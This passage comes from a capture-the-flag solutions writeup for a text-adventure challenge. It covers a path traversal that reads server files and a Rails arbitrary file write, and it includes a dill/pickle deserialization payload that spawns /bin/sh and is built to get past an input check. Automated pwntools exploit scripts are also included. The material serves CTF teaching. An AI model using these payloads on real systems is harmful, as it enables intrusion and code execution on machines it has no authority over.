# 1865 Text Adventure Solutions

The solutions to the challenge are packaged in a Docker container that handles all of the
dependencies and compilation of custom code. The assumption made as a default is that the challenges
container is run on the same host as the solutions container, and binds the exposed challenge port
to 31337.

This is reflected in the default `config.py`:

```python
#!/usr/bin/env python

import os


# Docker IP pointing to the host.
TARGET_IP = os.getenv('TARGET_IP', '172.17.0.1')
TARGET_PORT = os.getenv('TARGET_PORT', 31337)
```

The value of `172.17.0.1` refers to the [default bridge
network](https://docs.docker.com/network/network-tutorial-standalone/). Either change the default
values, or define the `TARGET_IP` and `TARGET_PORT` environment variables when invoking the scripts
to suit your networking needs.

## Building

To build the container:

```shell
$ make build
```

Note that this can take quite a while as the custom FST ysoserial fork has to compile from scratch.

## Running

To run an interactive `/bin/bash` shell in the container:

```shell
$ make run
```

If a development session is required, the following command will drop you into a `/bin/bash` root
shell with the `solutions` directory mounted so that edits to the files will be reflected in the
container:

```shell
$ make dev
```

When dropped into the shell, check that connectivity to the target server from the solutions
container works.

```shell
root@4f36819a79aa:/opt/wonderland# nc 172.17.0.1 31337
Connected.
Fracture Runtime Environment v0.0.13 -- (c) 2021 -- Steel Worlds Entertainment
Multi-User License: 100-0000-000
Loading assets...
Generating world...
...
```

The executable Python scripts containing the full exploits for each of the stages are:

1. 1_arbitrary_file_read.py
2. 2_insecure_dill_loads.py
3. 3_constantize_send.py
4. 4_a_mad_tea_party.py

They can be executed like so:

```shell
root@4f36819a79aa:/opt/wonderland# ./1_arbitrary_file_read.py
[+] Opening connection to 172.17.0.1 on port 31337: Done
[.\......] Initialising connection. This will take a moment...
[*] Moving to the a-shallow-deadend to get the pocket-watch...
[*] Disabling text scroll.
[*] Moving to a-curious-hall to drink the pink-bottle...
[*] Moving to a-fancy-pavillion to eat the fluffy-cake...
[*] Moving to a-mystical-cove to get the looking-glass...
[*] Triggering path traversal vulnerability to navigate to /
[*] Moving to /home/rabbit
[*] Reading the flag at /home/rabbit/flag1
[+] Flag 1:
[+] TISC{flag1}

[*] Closed connection to 172.17.0.1 port 31337
root@4f36819a79aa:/opt/wonderland#
```

## Full Writeup

This writeup is presented from the point-of-view of the participant and shows how the intended
solution does not require guessing or brute-forcing. It does require a familiarity with a wide
variety of topics, however.

The writeup does not use the supplied optional hints.

### Stage 1: Down the Rabbit Hole

The challenge text for this stage is:

```
Text adventures are fading ghosts of a long time past but this one looks suspiciously brand new.
We want to learn more about the White Rabbit but when we connect to the game, we just keep getting
lost! Can you help us take a look at the secrets in the Rabbit's burrow?

The game is hosted at `172.17.0.1:31337`.
```

#### Background and Initial Experimentation

To begin, connecting to the challenge server gives us a bunch of slow scrolling text adventure-style
output. Finally, it informs us that we have moved to a new location 'bottom-of-a-pit' and lists some
exits.


```shell
root@bf77445f0bce:/opt/wonderland# nc 172.17.0.1 31337
Connected.
Fracture Runtime Environment v0.0.13 -- (c) 2021 -- Steel Worlds Entertainment
Multi-User License: 100-0000-000
Loading assets...
Generating world...
...
BUMP!

You have moved to a new location: 'bottom-of-a-pit'.

You look around and see:
The bottom of a crummy tunnel.

You see exits to the:
  * a-shallow-deadend
  * deeper-into-the-burrow

[bottom-of-a-pit]
```

Typing a random command tells us that the 'help' command exists.

```shell
[bottom-of-a-pit] qwert
Don't know what you mean. Maybe try asking for 'help'.
[bottom-of-a-pit]
```

Using it lists a bunch of available commands.

```shell
[bottom-of-a-pit] help
Available commands: help, look, move, back, read, get, exit
[bottom-of-a-pit]
```

The usages of each of the commands can also be checked using the help command.

```shell
[bottom-of-a-pit] help help
Usage: help [command]
Prints the help documentation for a particular command.
[bottom-of-a-pit] help look
Usage: look
Looks around the room
[bottom-of-a-pit] help move
Usage: move [to room]
Moves to another room
[bottom-of-a-pit] help back
Usage: back
Goes back to the previous room.
[bottom-of-a-pit] help read
Usage: read [note]
Reads a note on the ground.
[bottom-of-a-pit] help get
Usage: read [note]
Reads a note on the ground.
[bottom-of-a-pit] help exit
Usage: exit
Exits from the game.
[bottom-of-a-pit]
```

The 'move' command lets the player move rooms. Moving to `a-shallow-deadend`, we are introduced to
some new objects.

```shell
[bottom-of-a-pit] move a-shallow-deadend
You have moved to a new location: 'a-shallow-deadend'.

You look around and see:
A sandy wall terminates the end of the claustrophobic passage. There is nothing here but a pile of old paper.

There are the following things here:
  * pocket-watch (item)
  * README (note)

[a-shallow-deadend]
```

With some experimentation, we find that we can 'read' notes and 'get' items. The note contains a
little hint as to the direction the player should take to progress.

```shell
[a-shallow-deadend] read README
You read the writing on the note:
Seek out the Looking Glass, little Alice.
It just might help to... open your eyes.

In the meantime, here's something to help with a little... introspection.

- The Cheshire Cat

[a-shallow-deadend] get pocket-watch
You pick up 'pocket-watch'.
The pocket watch glows with a warm waning energy and you feel less muddled in mind.
[a-shallow-deadend]
```

After the `pocket-watch` has been picked up, a new command appears in the 'help' list:

```shell
[a-shallow-deadend] help options
Usage: options [key] [value]
Views and modifies game options.
[a-shallow-deadend]
```

Listing the 'options' gives us the ability to modify the `text_scroll` option to 'false', disabling
the time-wasting scrolling.

```shell
[a-shallow-deadend] options text_scroll false
[a-shallow-deadend] options
The following options are available:
  * text_scroll: False
  * rainbow: False
[a-shallow-deadend]
```

As this room appears to be a terminal node, we have to move backwards a room. This can be done using
the 'back' command.

```shell
[a-shallow-deadend] back
You have moved to a new location: 'bottom-of-a-pit'.

You look around and see:
The bottom of a crummy tunnel.

You see exits to the:
  * a-shallow-deadend
  * deeper-into-the-burrow

[bottom-of-a-pit]
```

Moving from `bottom-of-a-pit` to `deeper-into-the-burrow` to `a-curious-hall`, the player comes upon
a three-way fork.

```shell
[deeper-into-the-burrow] move a-curious-hall
You have moved to a new location: 'a-curious-hall'.

You look around and see:
Breaking through the opening, you find yourself in an odd curious hall. There are three doors here,
in three bright colours: green, blue, and red.

There are the following things here:
  * pink-bottle (item)
  * a-burnt-parchment (note)
  * note-attached-to-bottle (note)

You see exits to the:
  * a-blue-door
  * a-red-door
  * a-green-door

[a-curious-hall]
```

Each of the doors lead to nowhere but the notes in the room give some clues about how to proceed.

```shell
[a-curious-hall] read a-burnt-parchment
You read the writing on the note:
Which of these would you choose, I wonder?

[a-curious-hall] read note-attached-to-bottle
You read the writing on the note:
DRINK ME

[a-curious-hall]
```

Getting the `pink-bottle` causes the player to drink it and shrink such that a tiny pink door is now
accessible.

```shell
[a-curious-hall] get pink-bottle
You pick up 'pink-bottle'.
As you examine the bottle, an overwhelming urge to tip the contents into your mouth overwhelms you. When the pink liquid touches your lips, the croying taste of cakes, and pastries, and pies fills your senses.

However, you realise with horror that the entire world is growing larger...
Or was it you that was growing smaller?
You have moved to a new location: 'a-massive-hall'.

You look around and see:
Now that you are the size of a rat, the three doors from before tower out of your reach. However,
you spot a tiny pink door with a tiny brass door knob, perfect for a tiny human.

You see exits to the:
  * a-pink-door

[a-massive-hall]
```

Following through `a-pink-door` to `maze-entrance` presents a simple maze for the player to explore.

```shell
[a-massive-hall] move a-pink-door
You have moved to a new location: 'a-pink-door'.

You look around and see:
A short hallway leads to the outside.

You see exits to the:
  * maze-entrance

[a-pink-door] move maze-entrance
You have moved to a new location: 'maze-entrance'.

You look around and see:
Nothing but green leaves all around you.

You see exits to the:
  * knotted-boughs
  * a-lush-turn

[maze-entrance]
```

The goal is to reach `a-fancy-pavillion`. With some experimentation, the path to this room is
`knotted-boughs` to `dazzling-pines` to `a-pause-in-the-trees` to `confusing-knot` to
`green-clearing`.

```shell
[green-clearing] move a-fancy-pavillion
You have moved to a new location: 'a-fancy-pavillion'.

You look around and see:
A fancy pavallion sits here, deep in the heart of the maze. At the center of the structure is a
tall gold-rimmed table. Upon the table is a single slice of fluffy cake on a plate made of fine
china.

There are the following things here:
  * fluffy-cake (item)
  * note-attached-to-cake (note)

[a-fancy-pavillion]
```

Reading the note and eating the cake enlarges the character once more and teleports her to yet
another room (`along-the-rolling-waves`), progressing the story.

```shell
[a-fancy-pavillion] read note-attached-to-cake
You read the writing on the note:
EAT ME

[a-fancy-pavillion] get fluffy-cake
You pick up 'fluffy-cake'.
You pick up the nice fluffy slice of cake, and promptly stuff it into your mouth. This time, the world flits away downwards as your neck grows longer and longer, rising high above the trees...
Feeling utterly confused, you begin to cry. Each tear that falls grows bigger and bigger in proportion with your gigantic body...
The tears pool at your feet creating a tiny puddle...
... a medium puddle...
... a large puddle...
... a large lake...
Eventually, the tears form a large sea and you float away in the brine.
You have moved to a new location: 'sea-of-tears'.

You look around and see:
Large salt waves crash all around you. You grab hold onto a piece of driftwood and struggle to stay
afloat.

You see exits to the:
  * along-the-rolling-waves

[sea-of-tears]
```

The next interesting location is `a-mystical-cove`, reachable by moving from `sea-of-tears` to
`along-the-rolling-waves` to `a-sandy-shore`.

```shell
[a-sandy-shore] You have moved to a new location: 'a-mystical-cove'.

You look around and see:
This cave is dark but buzzes with an subtle electricity. A faint wide smile appears to wink at you
from the shadows.

There are the following things here:
  * looking-glass (item)
  * README (note)

[a-mystical-cove]
```

Reading the note and picking up the item gives us a hint that a significant event has happened.

```shell
[a-mystical-cove] read README
You read the writing on the note:
Well done, now the story's just begun.

- Cheshire

[a-mystical-cove] get looking-glass
You pick up 'looking-glass'.
You pick up the looking glass and look through the lens. Through it you see a multitude of infinite worlds, infinite Universes. Suddenly, you feel much more powerful.
[a-mystical-cove]
```

Checking 'help' shows us that the new 'teleport' command was added.

```shell
[a-mystical-cove] help
Available commands: help, look, move, back, read, get, exit, options, teleport
[a-mystical-cove] help teleport
Usage: teleport [location]
Views current location or teleport to another.
[a-mystical-cove]
```

Using the 'teleport' command without any arguments tells us the reference of the current room.

```shell
[a-mystical-cove] teleport
You are currently at:
sea-of-tears/along-the-rolling-waves/a-sandy-shore/a-mystical-cove
[a-mystical-cove]
```

Passing in that reference as an argument to the 'teleport' command brings us to the room.

```shell
[a-mystical-cove] teleport sea-of-tears/along-the-rolling-waves/a-sandy-shore/a-mystical-cove
You have moved to a new location: 'a-mystical-cove'.

You look around and see:
This cave is dark but buzzes with an subtle electricity. A faint wide smile appears to wink at you
from the shadows.

There are the following things here:
  * README (note)

[a-mystical-cove]
```

#### Discovering and Exploiting the Directory Traversal

The presence of '/' characters hint that maybe the rooms are web pages or directories. Attempting
the standard directory traversal payload yields this error message:

```shell
[sea-of-tears] teleport ../../../../../../../
Cannot travel through empty rooms. Pay attention to this!
[sea-of-tears]
```

This error message draws attention to the possibility that the '/' characters are used as delimiters
in splitting the rooms to travel through. So the empty space after the '/' fails the check that a
room must be specified. Modifying the payload slightly allows the attack to succeed, presenting the
filesystem root as an in-game room.

```shell
[a-mystical-cove] teleport ../../../../../..
You have moved to a new location: '..'.

You look around and see:
Darkness fills your senses. Nothing can be discerned from your environment.
You see exits to the:
  * tmp
  * lib
  * media
  * lib64
  * usr
  * etc
  * sbin
  * home
  * srv
  * opt
  * proc
  * mnt
  * lib32
  * dev
  * run
  * libx32
  * sys
  * root
  * boot
  * var
  * bin
  * snap

[..]
```

If we move to `etc`, we can see that the files are interpreted as notes that we can read.

```shell
[..] move etc
You have moved to a new location: 'etc'.

You look around and see:
Darkness fills your senses. Nothing can be discerned from your environment.
There are the following things here:
  * subuid (note)
  * ld.so.cache (note)
  * issue.net (note)
  * debconf.conf (note)
...
[etc] read issue
You read the writing on the note:
Ubuntu 20.04.2 LTS \n \l


[etc]
```

If we move to `/home`, we can see that a number of user home directories are listed.

```shell
[..] move home
You have moved to a new location: 'home'.

You look around and see:
Darkness fills your senses. Nothing can be discerned from your environment.
You see exits to the:
  * mouse
  * rabbit
  * hatter

[home]
```

Attempting to move to the `mouse` and `hatter` directories yield a `PermissionError` message as well
as hint that the Python game code is located `/opt/wonderland/down-the-rabbithole/rabbithole.py`.

```shell
[home] move mouse
You have moved to a new location: 'mouse'.

Traceback (most recent call last):
  File "/opt/wonderland/down-the-rabbithole/rabbithole.py", line 706, in run_game
    self.evaluate(user_line)
  File "/opt/wonderland/down-the-rabbithole/rabbithole.py", line 625, in evaluate
    cmd.run(args)
  File "/opt/wonderland/down-the-rabbithole/rabbithole.py", line 275, in run
    self.game.move_to(args[1])
  File "/opt/wonderland/down-the-rabbithole/rabbithole.py", line 679, in move_to
    self.get_command('look').run(['look'])
  File "/opt/wonderland/down-the-rabbithole/rabbithole.py", line 238, in run
    for ent in self.game.get_invis():
  File "/opt/wonderland/down-the-rabbithole/rabbithole.py", line 659, in get_invis
    return self.get_ents()[2]
  File "/opt/wonderland/down-the-rabbithole/rabbithole.py", line 634, in get_ents
    for ent in self.location.iterdir():
  File "/usr/lib/python3.8/pathlib.py", line 1118, in iterdir
    for name in self._accessor.listdir(self):
PermissionError: [Errno 13] Permission denied: '/opt/wonderland/down-the-rabbithole/stories/../../../../../../home/mouse'

[mouse]
```

However, navigating into `rabbit` works and allow us to list the contents.

```shell
[home] move rabbit
You have moved to a new location: 'rabbit'.

You look around and see:
Darkness fills your senses. Nothing can be discerned from your environment.
There are the following things here:
  * flag2.bin (note)
  * flag1 (note)

[rabbit]
```

Reading the `flag1` note grants us the first flag.

```shell
[rabbit] read flag1
You read the writing on the note:
TISC{flag1}

[rabbit]
```

Reading the `flag2.bin` file yields binary gibberish instead. However, looking at the present
strings such as `'/home/mouse/flag2'` indicate that it is a binary that has to be executed, possibly
SUID, that reads the flag.

#### Automating the Exploit

Since the sequence of events is quite long and tedious to enter manually each time the service times
out, there is value in automating interactions with the server. This is also useful as it will be
built upon in the later stages.

This skeleton is implemented in `common.py` as the `Common` class.

First, a `get_connection` factory method is defined to initialise a `Common` object with a pwntools
remote connection object.

```python
class Common:
    '''Class encapsulating common game methods.
    '''

    def __init__(self, p):
        self.p = p

    # Factory

    @staticmethod
    def get_connection(ip=TARGET_IP, port=TARGET_PORT):
        '''Returns a pwntools connection.
        '''
        return Common(remote(ip, port))
```

Next, we define methods to detect where the prompt is to get rid of extraneous data.

```python
    def init_connection(self):
        '''Gets rid of all the starting stuff.
        '''
        log.progress('Initialising connection. This will take a moment...')
        self.get_until_prompt()

    def get_until_prompt(self):
        '''Receives until the prompt is found.
        '''
        self.recvuntil(b'] ')
```

Also, we want to turn in-game actions into an API that we can call programmatically. These functions
correspond to an in-game command and perform the appropriate parsing of the response where
necessary.

```python
    def move(self, location):
        '''Navigates to a particular location.
        '''
        self.sendline(b'move ' + location)
        self.get_until_prompt()

    def get(self, item):
        '''Gets an item from the ground.
        '''
        self.sendline(b'get ' + item)
        self.get_until_prompt()

    def back(self):
        '''Moves back a room.
        '''
        self.sendline(b'back')
        self.get_until_prompt()

    def multimove(self, locations):
        '''Move multiple locations.
        '''
        for location in locations:
            self.move(location)

    def read(self, note):
        '''Reads a note.
        '''
        self.sendline(b'read ' + note)
        self.recvuntil(b'You read the writing on the note:\n')
        data = self.recvuntil(b'[')
        self.get_until_prompt()
        return data[:-1]

    def exit(self):
        '''Quits the game.
        '''
        self.sendline(b'exit')
        self.recvuntil('Goodbye!')
```

Finally, some raw passthrough functions are defined so that they can be interacted with in the same
fashion as the original pwntools connection.

```python
    # Raw Passthroughs

    def sendline(self, data):
        '''Sends some byte data.
        '''
        self.p.sendline(data)

    def recvuntil(self, data):
        '''Receives until some data is met.
        '''
        return self.p.recvuntil(data)

    def interactive(self):
        '''Starts an interactive shell.
        '''
        self.p.interactive()
```

Putting everything together, the following script automates obtaining the `pocket-watch`, disabling
the `text_scroll` option, navigating through the maze of the story, finding the `looking-glass`, and
triggering the directory traversal.

```python
from pwn import *
from common import Common


def main():
    # Get the connection.
    c = Common.get_connection()
    c.init_connection()

    # Move to the a-shallow-deadend to get the pocket-watch.
    # This pocket-watch allows us to turn off text scrolling.
    log.info('Moving to the a-shallow-deadend to get the pocket-watch...')
    c.move(b'a-shallow-deadend')
    c.get(b'pocket-watch')
    log.info('Disabling text scroll.')
    c.sendline(b'options text_scroll f')
    c.back()

    # Move to the a-curious-hall and drink the pink-bottle.
    log.info('Moving to a-curious-hall to drink the pink-bottle...')
    next_path = [b'deeper-into-the-burrow', b'a-curious-hall', b'a-curious-hall']
    c.multimove(next_path)
    c.get(b'pink-bottle')

    # Move to the a-fancy-pavillion and eat the fluffy-cake.
    log.info('Moving to a-fancy-pavillion to eat the fluffy-cake...')
    next_path = [b'a-pink-door', b'maze-entrance', b'knotted-boughs', b'dazzling-pines',
                 b'a-pause-in-the-trees', b'confusing-knot', b'green-clearing',
                 b'a-fancy-pavillion']
    c.multimove(next_path)
    c.get(b'fluffy-cake')

    # Move to a-mystical-cove to get the looking-glass.
    log.info('Moving to a-mystical-cove to get the looking-glass...')
    next_path = [b'along-the-rolling-waves', b'a-sandy-shore', b'a-mystical-cove', ]
    c.multimove(next_path)
    c.get(b'looking-glass')

    # Trigger the path traversal to get to the root.
    log.info('Triggering path traversal vulnerability to navigate to /')
    c.sendline('teleport ../../../../../../..')

    # Move to /home/rabbit/
    log.info('Moving to /home/rabbit')
    next_path = [b'home', b'rabbit']
    c.multimove(next_path)

    # Get the flag.
    log.info('Reading the flag at /home/rabbit/flag1')
    flag1 = c.read(b'flag1')
    log.success('Flag 1:')
    log.success(flag1.decode('ascii'))

    # Present an interactive prompt.
    c.interactive()
```

Running the exploit:

```shell
root@6c1aa90244ec:/opt/wonderland# ./1_arbitrary_file_read.py
[+] Opening connection to 172.17.0.1 on port 31337: Done
[...\....] Initialising connection. This will take a moment...
[*] Moving to the a-shallow-deadend to get the pocket-watch...
[*] Disabling text scroll.
[*] Moving to a-curious-hall to drink the pink-bottle...
[*] Moving to a-fancy-pavillion to eat the fluffy-cake...
[*] Moving to a-mystical-cove to get the looking-glass...
[*] Triggering path traversal vulnerability to navigate to /
[*] Moving to /home/rabbit
[*] Reading the flag at /home/rabbit/flag1
[+] Flag 1:
[+] TISC{flag1}

[*] Switching to interactive mode
$
```

The full exploit can be found in `1_arbitrary_file_read.py`.


### Stage 2: Pool of Tears

The challenge text for this stage is:

```
It looks like the Rabbit has been misbehaving. Within his cache of secrets lies a special device
that does not belong to him. However, our attempts read it yield gibberish. It appears to require...
activation. To activate it, we must first become Rabbit.

Please assume the identity of the Rabbit.

The game is hosted at `172.17.0.1:31337`.
```

#### Understanding the System

Since the `flag2.bin` contents look a lot like an ELF file, and the challenge text seems to request
that we assume the identity of the Rabbit, it can be inferred that we need to obtain a shell.

To proceed, we should understand the game using the newfound arbitrary read capability. First, we
can teleport to the `/opt/wonderland/down-the-rabbithole/` directory.

```shell
$ teleport ../../../../../../opt/wonderland/down-the-rabbithole
You have moved to a new location: 'down-the-rabbithole'.

You look around and see:
Darkness fills your senses. Nothing can be discerned from your environment.
There are the following things here:
  * requirements.txt (note)
  * generate_items.py (note)
  * rabbithole.py (note)
  * rabbit_conf.py (note)

You see exits to the:
  * stories
  * __pycache__
  * art

[down-the-rabbithole] $
```

This lets us read some important files such as `generate_items.py` and `rabbithole.py`. The
interesting snippet from the former includes this Golden Hookah item. It also tells us where the
item is located.

```python
# Golden Hookah - at under-a-giant-mushroom
# Grants the player the ability to blow smoke into words.

def golden_hookah_on_get(self):
    '''Grants the blow smoke command.
    '''
    ...
    self.game.commands.append(BlowSmokeCommand(self.game))
    self.game.teleport(STORY_BASE / 'vast-emptiness')

def setup_golden_hookah():
    item = make_item('golden-hookah', golden_hookah_on_get)
    path = (STORY_BASE / 'sea-of-tears/along-the-rolling-waves/a-sandy-shore/into-the-woods/'
            'further-into-the-woods/nearing-a-clearing/clearing-of-flowers/under-a-giant-mushroom/'
            'golden-hookah.item')
    write_object(path, item)
```

This item grants the ability to 'blow smoke'. The `BlowSmokeCommand` object is defined in
`rabbithole.py`. It makes a HTTP request to the POOL_OF_TEARS.

```python
POOL_OF_TEARS = "http://localhost:4000/api/v1/smoke"
...
class BlowSmokeCommand(Command):
    '''Blows smoke to leave a mark on the world.
    '''

    def __init__(self, game):
        super().__init__(game)

    def run(self, args):
        if len(args) < 3:
            # Print location.
            letterwise_print("What do you wish to say?")
            return

        letterwise_print('Smoke bellows from the lips of {} to form the words, "{}."'.format(
            args[1], ' '.join(args[2:])))
        letterwise_print('Curling and curling...')
        uniqid = "{}-{}".format(self.game.location.name, clean_identifiers(args[1]))
        content = ' '.join(args[2:]).replace(' ', '%20').replace('&','')
        url = "{}?cargs[]=wb&uniqid={}&content={}".format(POOL_OF_TEARS, uniqid, content)
        response = urlopen(url)
        response_contents = response.read()
        if response_contents == b'OK':
            letterwise_print('The words float up high into the air and eventually disappate.')
        else:
            letterwise_print('The words harden into pasty rocks and drop to the ground.')
            letterwise_print('They spell:')
            letterwise_print(response_contents)

    def help(self):
        hstr = (
            'Usage: blowsmoke [your name] [your message]\n'
            'Leave your mark on the universe.'
        )
        return ('blowsmoke', hstr)

    def key(self, arg):
        return 'blowsmoke' ==  arg
```

The command constructs requests of the form:

`http://localhost:4000/api/v1/smoke?cargs[]=wb&uniqid=XXXX-YYYY&content=ZZZZ`

Where:

    * XXXX - The location name
    * YYYY - The user specified name
    * ZZZZ - The user specified message

Since this is a web service, URL encoded values can be passed allowing for non-alphanumeric
characters to be passed.

We can teleport to the location containing the `golden-hookah` to retrieve the item.

```shell
$ teleport sea-of-tears/along-the-rolling-waves/a-sandy-shore/into-the-woods/further-into-the-woods/nearing-a-clearing/clearing-of-flowers/under-a-giant-mushroom
You have moved to a new location: 'under-a-giant-mushroom'.

You look around and see:
The most massive mushroom you have ever seen looms over you. A large crumpled skin-like pile lies on
the ground nearby. It appears to be the (corpse?) of an enormous caterpillar.

There are the following things here:
  * golden-hookah (item)

[under-a-giant-mushroom] $ get golden-hookah
You pick up 'golden-hookah'.
Placing the mouthpiece of the hookah to your lips, a rush of rainbow smoke bellows suddenly into your lungs without even inhaling.
The smoke glows brightly as you try to get it out.
It floats heavily and lazily arranges itself into the words:


▄▄▌ ▐ ▄▌ ▄ .▄           ▄▄▄· • ▌ ▄ ·.     ▪
██· █▌▐███▪▐█▪         ▐█ ▀█ ·██ ▐███▪    ██
██▪▐█▐▐▌██▀▐█ ▄█▀▄     ▄█▀▀█ ▐█ ▌▐▌▐█·    ▐█·
▐█▌██▐█▌██▌▐▀▐█▌.▐▌    ▐█ ▪▐▌██ ██▌▐█▌    ▐█▌
 ▀▀▀▀ ▀▪▀▀▀ · ▀█▄▀▪     ▀  ▀ ▀▀  █▪▀▀▀    ▀▀▀


You have moved to a new location: 'vast-emptiness'.

You look around and see:
Once the smoke clears, you find yourself in the middle of a great nothingness. You drift, floating
in non-space.

There are the following things here:
  * README (note)

You see exits to the:
  * eternal-desolation

[vast-emptiness] $
```

This gives us a new 'blowsmoke' command.

```shell
[vast-emptiness] $ help
Available commands: help, look, move, back, read, get, exit, options, teleport, blowsmoke
[vast-emptiness] $ help blowsmoke
Usage: blowsmoke [your name] [your message]
Leave your mark on the universe.
[vast-emptiness] $
```

Running the command does not really reveal much.

```shell
[vast-emptiness] $ blowsmoke amon something cool
Smoke bellows from the lips of amon to form the words, "something cool."
Curling and curling...
The words float up high into the air and eventually disappate.
[vast-emptiness] $
```

Exploring the `/opt/wonderland` directory will give us more clues as what the 'POOL_OF_TEARS' is.
Teleporting there shows us that there is a corresponding directory.

```shell
[vast-emptiness] $ teleport ../../../../../../opt/wonderland
You have moved to a new location: 'wonderland'.

You look around and see:
Darkness fills your senses. Nothing can be discerned from your environment.
You see exits to the:
  * pool-of-tears
  * logs
  * a-mad-tea-party
  * down-the-rabbithole
  * utils

[wonderland] $
```

#### Discovering the Arbitrary Write Primitive

If we list it, it becomes apparent that the application is a Ruby on Rails service.

```shell
[wonderland] $ move pool-of-tears
You have moved to a new location: 'pool-of-tears'.

You look around and see:
Darkness fills your senses. Nothing can be discerned from your environment.
There are the following things here:
  * Rakefile (note)
  * Gemfile.lock (note)
  * config.ru (note)
  * run.sh (note)
  * README.md (note)
  * Gemfile (note)

You see exits to the:
  * tmp
  * lib
  * config
  * test
  * db
  * public
  * vendor
  * app
  * storage
  * log
  * bin

[pool-of-tears] $
```

We can read the `config/routes.rb` file to get a look at what routes are supported by the
application and their associated controller.

```ruby
[config] $ read routes.rb
You read the writing on the note:
Rails.application.routes.draw do
  root 'welcome#index'

  get "/api/v1/smoke", to: "smoke#remember"
  # For details on the DSL available within this file, see https://guides.rubyonrails.org/routing.html
end

[config] $
```

This controller is located at `app/controllers/smoke_controller.rb`.

```ruby
[controllers] $ read smoke_controller.rb
You read the writing on the note:
class SmokeController < ApplicationController

  skip_parameter_encoding :remember

  def remember
    # Log down messages from our happy players!

    begin
      ctype = "File"
      if params.has_key? :ctype
        # Support for future appending type.
        ctype = params[:ctype]
      end

      cargs = []
      if params.has_key?(:cargs) && params[:cargs].kind_of?(Array)
        cargs = params[:cargs]
      end

      cop = "new"
      if params.has_key?(:cop)
        cop = params[:cop]
      end

      if params.has_key?(:uniqid) && params.has_key?(:content)
        # Leave the kind messages
        fn = Rails.application.config.message_dir + params[:uniqid]
        cargs.unshift(fn)
        c = ctype.constantize
        k = c.public_send(cop, *cargs)
        if k.kind_of?(File)
          k.write(params[:content])
          k.close()
        else
          # Implement more types when we need distributed logging.
          render :plain => "Type is not implemented yet."
          return
        end

      else
        render :plain => "ERROR"
        return
      end
    rescue => e
      render :plain => "ERROR: " + e.to_s
      return
    end

    render :plain => "OK"
  end
end

[controllers] $
```

The value of `Rails.application.config.message_dir` can be gleaned from `config/application.rb`:

```ruby
    config.message_dir = "/opt/wonderland/logs/"
```

Since the earlier `rabbithole.py` example request looks like the following:

```
http://localhost:4000/api/v1/smoke?cargs[]=wb&uniqid=XXXX-YYYY&content=ZZZZ
```

The values the variables should look like this at the end of the function:

* `ctype = "File"`
* `cargs = ["XXXX-YYYY", "wb"]`
* `cop = "new"`
* `c = File`
* `k = <open file with wb flags>`

The Ruby code `File.new("/opt/wonderland/logs/XXXX-YYYY", "wb")` is evaluated. The content of `ZZZZ`
is also written to the newly opened file since it is of type `File`.

Since the values of `YYYY` (the name) and `ZZZZ` (the message) are controlled by the player with the
`BlowSmokeCommand`, this can be used to write arbitrary data to a file whose suffix is player
specified.

#### Discovering the Insecure Dill Deserialization

Going back to the `generate_items.py` script, we can see that the items are written to the story
tree locations with the following code:

```python
# Utilities

def write_object(location, obj):
    '''Writes an object to the specified location.
    '''
    with open(location, 'wb') as f:
        dill.dump(obj, f, recurse=True)


def make_item(key, on_get):
    '''Makes a new item dynamically.
    '''
    item = Item(key)
    item.on_get = types.MethodType(on_get, item)
    return item
```

This means that the items are dill-serialized. Dill is an extension of the standard Python pickle
that supports the pickling of typically unpickleable types and is also vulnerable to Pickle
deserialization payloads.

The un-dilling happens in the `GetCommand` of `rabbithole.py`:

```python
class GetCommand(Command):
    '''Gets an item from the ground in the current room.
    '''

    def __init__(self, game):
        super().__init__(game)

    ...

    def run(self, args):
        if len(args) < 2:
            letterwise_print("You don't see that here.")
            return
        for i in self.game.get_items():
            if (args[1] + '.item') == i.name and args[1] not in self.game.inventory:
                got_something = True
                # Check that the item must be serialized with dill.
                item_data = open(i, 'rb').read()
                if not self.validate_stream(item_data):
                    letterwise_print('Seems like that item may be an illusion.')
                    return
                item = dill.loads(item_data)
                letterwise_print("You pick up '{}'.".format(item.key))
                self.game.inventory[item.key] = item
                item.prepare(self.game)
                item.on_get()
                return

        letterwise_print("You don't see that here.")

    def help(self):
        hstr = (
            'Usage: read [note]\n'
            'Reads a note on the ground.'
        )
        return ('get', hstr)

    def key(self, arg):
        return 'get' ==  arg
```

One thing to note is that the file must have the suffix of `'.item'`. The interesting portion in the
`run` code is that it runs a function called `validate_stream` on the item data before allowing the
call to `dill.loads`. This turns out to be a function that disassembles the data using `pickletools`
and checks that the presence of a number of strings is in the data. This is a very easily bypassable
rudimentary check intended to check if the output is generated with dill. It will defeat the
standard Python pickle payloads found [on the
web](https://davidhamann.de/2020/04/05/exploiting-python-pickle/).

```python
    def validate_stream(self, data):
        '''Validates that the byte stream contains suitable dill serialized content.
        '''
        tests = {
            'rabbithole': False,
            'dill._dill': False,
            'on_get': False,
        }
        try:
            ops = pickletools.genops(data)
            for op, arg, pos in ops:
                if op.name == 'SHORT_BINUNICODE' and arg in tests:
                    tests[arg] = True
            for _, v in tests.items():
                if not v:
                    return False
            return True
        except:
            var = traceback.format_exc()
            pprint(var)
            return False
```

However, it is not difficult to ensure the presence of these strings. The serialized `Exploit` class
can be modified to the following.

```python
class Exploit:
    '''Spawns a /bin/bash shell when deserialized.

    Includes some required strings that are checked server-side to determine 'dill-ness'.
    '''

    def __reduce__(self):
        cmd = ('/bin/sh')
        return os.system, (cmd,), {'a': 'dill._dill', 'b': 'rabbithole', 'c': 'on_get'}
```

Alternatively, an actual `Item` class, including an arbitrarily defined `on_get` function, could be
serialized using the `generate_items.py` helpers so that the arbitrary code execution happens when
the `on_get` hook is run. The bypass above is the simpler approach.

#### Crafting an Exploit

To validate the observations so far, let's travel to `/opt/wonderland/logs` and attempt to blow some
smoke.

```shell
[vast-emptiness] $ teleport ../../logs
You have moved to a new location: 'logs'.

You look around and see:
Darkness fills your senses. Nothing can be discerned from your environment.
[logs] $ blowsmoke amon.item HELLOWORLD
Smoke bellows from the lips of amon.item to form the words, "HELLOWORLD."
Curling and curling...
The words float up high into the air and eventually disappate.
[logs] $ look
You look around and see:
Darkness fills your senses. Nothing can be discerned from your environment.
There are the following things here:
  * logs-amon (item)

[logs] $
```

A file called `logs-amon.item` was created. Attempting to get the item prints an error as expected:

```shell
[logs] $ get logs-amon
Traceback (most recent call last):
  File "/opt/wonderland/down-the-rabbithole/rabbithole.py", line 363, in validate_stream
    for op, arg, pos in ops:
  File "/usr/lib/python3.8/pickletools.py", line 2285, in _genops
    raise ValueError("at position %s, opcode %r unknown" % (
ValueError: at position 0, opcode b'H' unknown

Seems like that item may be an illusion.
[logs] $
```

To confirm that URL encoded messages work:

```shell
